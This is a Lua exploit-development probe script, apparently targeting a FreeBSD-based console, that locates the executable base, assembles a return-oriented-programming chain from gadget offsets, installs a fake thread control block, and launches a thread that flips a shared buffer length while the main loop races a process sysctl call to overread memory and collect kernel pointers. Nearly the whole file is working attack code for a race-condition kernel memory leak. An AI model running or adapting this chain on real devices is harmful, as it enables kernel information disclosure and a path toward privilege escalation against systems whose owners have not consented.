-- CRASH_CLASS: MODERATE
-- PROBE 393f: minimal ROP chain — use wq+uint64 like working 271g
--
-- 271g successfully built chains with wq(addr, uint64(val)).
-- 393b-393e crashed. Hypothesis: stdout corruption from high write volume.
-- Test: sysarch + 2 flips + exit = ~30 qwords total.

print("=== PROBE 393f: minimal chain ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fmt_a(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%X", N(val))
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eboot_lo = rd(N(info) + 0x108)
local eboot_hi = rd(N(info) + 0x10C)
local eboot = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot=" .. fmt_a(eboot))

-- Gadgets as uint64 (like 271g)
local function g(off)
    return uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
end

local g_pop_rax  = g(0x992)
local g_pop_rdi  = g(0xC9DFE)
local g_pop_rsi  = g(0xD77D)
local g_pop_rdx  = g(0x3B02D7)
local g_pop_rcx  = g(0xE64)
local g_bare_ret = g(0x42)
local g_mov_rdi_rax = g(0x92C67)
print("pop_rax=" .. fmt_a(g_pop_rax))

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
print("sigsys=ign")

-- Shared race mem
local shared = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(shared) + i, 0) end
local oldlenp = shared
local flag = uint64(N(shared) + 0x10)
wd(N(flag), 1)
wd(N(oldlenp), 0x448)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(fake_tcb, fake_tcb)  -- self-ref

local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, fake_tcb)

-- Stack
local SSIZE = 0x4000
local stk = memory.alloc(SSIZE)
for i = 0, SSIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local rsp = stk_base + SSIZE - 8
rsp = rsp - (rsp % 16)  -- align
print(string.format("rsp=%X", rsp))

-- Build chain using wq + uint64 (like 271g)
-- start_func = g_pop_rax, so [RSP+0] = first value for pop rax
local sp = rsp
local function push(val)
    wq(sp, val)
    sp = sp + 8
end

print("building chain...")

-- sysarch(165, SET_FSBASE=129, &tcb_ptr)
push(uint64(165))           -- RAX
push(g_pop_rdi)
push(uint64(129))           -- SET_FSBASE
push(g_pop_rsi)
push(uint64(N(tcb_ptr)))
push(g_pop_rdx)
push(uint64(0))
push(g_pop_rcx)
push(uint64(0))
push(stub)                   -- fn_addr syscall stub

print("sysarch ok")

-- 2 flip iterations
for i = 1, 2 do
    push(g_pop_rdi)
    push(uint64(N(oldlenp)))
    push(g_pop_rax)
    push(uint64(0x2000))     -- large
    push(g_mov_rdi_rax)

    push(g_pop_rdi)
    push(uint64(N(oldlenp)))
    push(g_pop_rax)
    push(uint64(0x448))      -- small
    push(g_mov_rdi_rax)
end

print("flips ok")

-- Signal done
push(g_pop_rdi)
push(flag)
push(g_pop_rax)
push(uint64(0))
push(g_mov_rdi_rax)

-- thr_exit(431)
push(g_pop_rax)
push(uint64(431))
push(g_pop_rdi)
push(uint64(0))
push(stub)

local chain_qwords = (sp - rsp) / 8
print(string.format("chain=%d qwords", chain_qwords))

-- Verify first entry
local v0 = rd(rsp) or 0
print(string.format("chain[0]=%08X (expect 0xA5=165)", v0))

-- thr_param
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
wq(pa, g_pop_rax)            -- start_func
wq(N(pa) + 8, uint64(0))     -- arg
wq(N(pa) + 0x10, uint64(stk_base))
wq(N(pa) + 0x18, uint64(SSIZE))
local ctid = memory.alloc(8)
wq(ctid, uint64(0))
wq(N(pa) + 0x30, ctid)

print("launching...")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr_new=%d", tret))

if tret ~= 0 then
    print("FAIL")
    return
end
if not alive() then print("DEAD"); return end

-- Race sysctl
print("racing...")
local mib = memory.alloc(16)
wd(N(mib), 1)
wd(N(mib) + 4, 14)
wd(N(mib) + 8, 1)
wd(N(mib) + 12, pid_val)
local outbuf = memory.alloc(0x2000)
local sc = mk(202)

local over_n = 0
local kptr_n = 0
for r = 1, 50 do
    if not alive() then break end
    for i = 0, 0x1FFC, 4 do wd(N(outbuf) + i, 0xDEADDEAD) end
    wd(N(oldlenp), 0x448)

    local ok_s, rv_s = pcall(function()
        return sc(uint64(N(mib)), uint64(4), outbuf,
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    if ok_s and N(rv_s) == 0 then
        local past = false
        for off = 0x448, 0x460, 4 do
            local d = rd(N(outbuf) + off)
            if d and d ~= 0xDEADDEAD then past = true; break end
        end
        if past then
            over_n = over_n + 1
            for off = 0x448, 0x1FF0, 8 do
                local lo = rd(N(outbuf) + off)
                local hi = rd(N(outbuf) + off + 4)
                if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    kptr_n = kptr_n + 1
                    if kptr_n <= 5 then
                        print(string.format("KPTR r%d +%03X %08X_%08X", r, off, hi, lo))
                    end
                end
            end
        end
    end
end

print(string.format("over=%d kptr=%d done=%s",
    over_n, kptr_n, rd(N(flag)) == 0 and "y" or "n"))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 393f COMPLETE ===")
